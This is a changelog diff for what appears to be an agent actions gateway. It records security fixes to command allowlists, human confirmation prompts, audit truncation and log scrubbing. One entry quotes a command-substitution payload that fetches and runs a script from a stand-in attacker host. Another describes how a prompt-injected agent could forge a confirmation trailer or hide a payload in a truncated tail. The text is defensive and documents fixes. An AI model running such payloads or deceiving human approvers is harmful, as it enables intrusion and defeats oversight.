@@ -6,14 +6,6 @@ All notable changes to this project are documented here. The format follows
 
 ## [Unreleased]
 
-### Docs
-
-- The independent reviews of the actions layer are published verbatim under `docs/reviews/`: a
-  security review of the whole layer at M14 (nine findings, three required before approval) and a
-  second reviewer's report on the `ssh` and `winrm` connectors, written independently over the same
-  tree. They agreed, separately, on two findings, which is why both are published rather than one
-  summarised. The fixes for the findings are recorded in their own entries.
-
 ### Added
 
 - A confirmation-message rendering test per connector (spec 13 §13.8, M14; ACT-43): the exact
@@ -123,6 +115,65 @@ All notable changes to this project are documented here. The format follows
 
 ### Fixed
 
+- **ACT-35, ACT-39, ACT-88: a wildcard in a command allowlist was an unrestricted shell.** `*`
+  matches any run of characters, and `;`, `&&`, `|`, a backtick and `$( )` are characters, so a
+  pattern could not restrain them: measured against the operator guide's own recommended
+  patterns, `journalctl -u nginx --since *` admitted
+  `journalctl -u nginx --since $(curl -s http://attacker/p | sh)`, and bounding the wildcard on
+  both sides — the shape the guide presented as the safe idiom — did not help, because command
+  substitution sits inside the run the `*` matches. Every `allowed_commands` target holding a
+  wildcard was therefore an `any_command` target in practice, but without the deployment switch,
+  the standing operator warning, `unrestricted: true` in `actions_list_targets` or the full
+  command in `classification` — the whole of T24's command-allowlist mitigation, bypassed by
+  punctuation. A command on a target that is not an any-command one may now contain no shell
+  metacharacter (`;`, `&`, `|`, a backtick, `$`, `<`, `>`, `(`, `)`), exactly as it may contain
+  no line break, and is refused with the new `policy_denied` reason `command_metacharacter`
+  before anything connects. A pattern that holds one is refused at save, because no command that
+  matched it could ever be allowed. The refusal is a runtime rule rather than a save-time
+  warning because a warning would have had to fire on every wildcard, which is most of them: a
+  wildcard is a legitimate way to fill in an argument, and it is now only that. The guide says
+  what a `*` can and cannot do, including the residue a wildcard genuinely leaves — the rest of
+  the allowed program's own command line, which needs no metacharacter — and the specification
+  says what the code does.
+- **ACT-42, ACT-43: the human confirmation prompt was silently truncated, and its trailer could
+  be forged.** The prompt is what T24 relies on to stop a prompt-injected agent in front of an
+  honest human, and a person who ticks a box for text whose dangerous clause was cut has been
+  given the appearance of consent rather than the substance: a 1210-character command showed
+  1024 characters with the tail invisible and nothing saying so. The summary is now the first
+  768 characters and the last 192 — the tail is where an appended payload hides — and the
+  message carries a line of vaultgate's own saying how many characters are missing and the
+  SHA-256 of the whole operation. vaultgate does not refuse to confirm a long operation: refusing
+  would push an operator towards `confirm_writes: false`, which is the weaker of the two states
+  the clause exists to protect. Every line of the summary is now quoted with `>` and the message
+  says so, so an agent can no longer reproduce the prompt's own trailer between the `\n\n`
+  delimiters and make the message appear to end early — anything it wrote is a quoted line, and
+  the trailer is the only unquoted one. On the audit side, an `arguments` value cut at the 4 KiB
+  cap now says so in the stored text and carries the SHA-256 of the whole: `ssh` and `winrm` have
+  ACT-88's full command in `classification`, but a 64 KiB `sql` statement had no fallback at all
+  and hid its operative clause from the ACT-63 unexpected-write view.
+- **ID-18: a synchroniser token of the same code-unit length but a different byte length crashed
+  the route.** `timingSafeEqual` raises a `RangeError` on buffers of different lengths, so the
+  comparison threw and the route answered `500` with no audit event, where ID-18 requires `403`
+  with one — a silent gap in the trail is exactly what an operator needs to see. The comparison
+  is over byte lengths now.
+- **ID-24: a notice query parameter naming an inherited property crashed the page.** `/account`
+  and `/account/actions/:id` indexed a plain object with the parameter, so `?notice=constructor`
+  returned a function to the renderer and answered `500`. The lookup is an own-property one.
+- **ID-19: the Actions pages inherited their CSP and `no-store` from identity's mount order.** The
+  headers arrived only because `identity.routes` is mounted before the actions pages in
+  `http/app.ts`. The pages now set them through the middleware identity hands the composition
+  layer, and a test asserts both on every Actions page.
+- **ACT-53: a driver message reached the log unscrubbed on one path in `sql` and `winrm`.** pino's
+  OPS-1 redaction works by field name, so the free-text reason logged when a session would not
+  close or a shell would not delete was the one place upstream text left those connectors without
+  passing the call's scrub table. `RunSupport` gains `scrub`, which both now use. The `winrm`
+  half also logged only the fixed §13.16 sentence rather than the service's own words, so it said
+  nothing an operator could act on; it now reports the fault's reason, scrubbed.
+- Performance, not a defect: `engine-run` scrubbed every captured stream twice, once in the
+  capture pass and again in the deep pass over the merged result — about 166 ms per MiB with a
+  four-secret table, on the event loop that also serves OAuth and the operator pages. Only the
+  connector's own result fields go through the deep pass now, and the scrubber skips a position
+  no variant can begin at, which is nearly all of them.
 - **ACT-51, ACT-52, ACT-53: a body that was not text defeated the scrubber.** The `http`
   connector base64-encoded the body itself; base64 is positional, so no ACT-51 variant matched
   and the credential came back verbatim under `body_encoding`, at any offset. Connectors no
